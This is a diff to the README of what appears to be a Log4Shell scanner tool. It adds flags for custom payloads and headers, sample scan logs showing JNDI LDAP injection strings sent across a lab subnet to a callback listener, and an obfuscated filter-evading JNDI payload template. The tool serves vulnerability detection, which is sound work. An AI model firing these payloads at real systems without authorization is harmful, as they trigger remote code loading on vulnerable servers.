@@ -78,9 +78,14 @@ Usage:
 Flags:
       --caddr string            address to catch the callbacks (eg. ip:port)
       --cidr string             subnet to scan (default "192.168.1.0/28")
+      --fields-file string      use custom field from file
+      --headers-file string     use custom headers from file
   -h, --help                    help for remote
       --listen                  start a listener to catch callbacks
+      --no-redirect             do not follow redirects
       --no-user-agent-fuzzing   exclude user-agent header from fuzzing
+      --no-wait-timeout         wait forever for callbacks
+      --payloads-file string    use custom payloads from file
   -p, --port stringArray        port to scan (default [8080])
       --proxy string            proxy url
       --schema string           schema to use for requests (default "https")
@@ -100,24 +105,31 @@ scanner_1  | 2021/12/16 09:57:24 [i] Log4Shell CVE-2021-44228 Remote Vulnerabili
 scanner_1  | 2021/12/16 09:57:24 [i] Listening on 172.20.0.30:4444
 scanner_1  | 2021/12/16 09:57:24 [i] Start scanning CIDR 172.20.0.0/24
 scanner_1  | ---------
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.0:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.1:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.2:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.3:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.4:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.5:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.6:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.7:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.8:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.9:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.10:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.11:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.12:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.13:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.14:8080
-scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.15:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.0:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.1:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.2:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.3:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.4:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.5:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.6:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.7:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.8:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.9:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.10:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.11:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.12:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.13:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.14:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} for http://172.20.0.15:8080
 scanner_1  | 2021/12/16 09:57:24 [!] Possibly vulnerable host identified: 172.20.0.13:60614
 ```
+
+### Custom Payload
+If you specify a file with self-created payloads. You can use the following placeholders for the callback address and resource:
+- {{ .CADDR }}
+- {{ .Resource }}
+
+For example: `${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{ .CADDR }}/{{ .Resource }}}`
 
 ## References
 - https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
